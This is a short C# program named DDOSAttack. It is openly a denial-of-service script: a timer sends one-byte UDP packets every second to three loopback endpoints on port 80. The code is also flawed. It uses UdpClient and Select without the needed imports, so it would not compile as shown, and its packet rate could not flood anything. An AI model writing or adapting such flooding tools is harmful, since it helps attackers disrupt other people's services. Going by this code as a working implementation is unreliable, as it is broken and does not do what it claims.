using System;
using System.Net;
using System.Threading.Tasks;

class DDOSAttack
{
    static void Main(string[] args)
    {
        //Create an array of IPEndPoints
        IPEndPoint[] endPoints = new IPEndPoint[3] 
        {
            new IPEndPoint(IPAddress.Parse("127.0.0.1"), 80),
            new IPEndPoint(IPAddress.Parse("127.0.0.2"), 80),
            new IPEndPoint(IPAddress.Parse("127.0.0.3"), 80)
        };

        //Create a UdpClient
        UdpClient udpClient = new UdpClient();

        //Register a timer that will execute its Elapsed event every second
        System.Timers.Timer timer = new System.Timers.Timer(1000);
        timer.Elapsed += async (sender, e) =>
        {
            //Send multiple packets to each endpoint at the same time
            await Task.WhenAll(endPoints.Select(async endPoint => 
            {
                await udpClient.SendAsync(new byte[1], 1, endPoint);
                Console.WriteLine("Sent packet to {0}", endPoint);
            }));

        };
        timer.Start();
        Console.ReadKey(true);
    }
}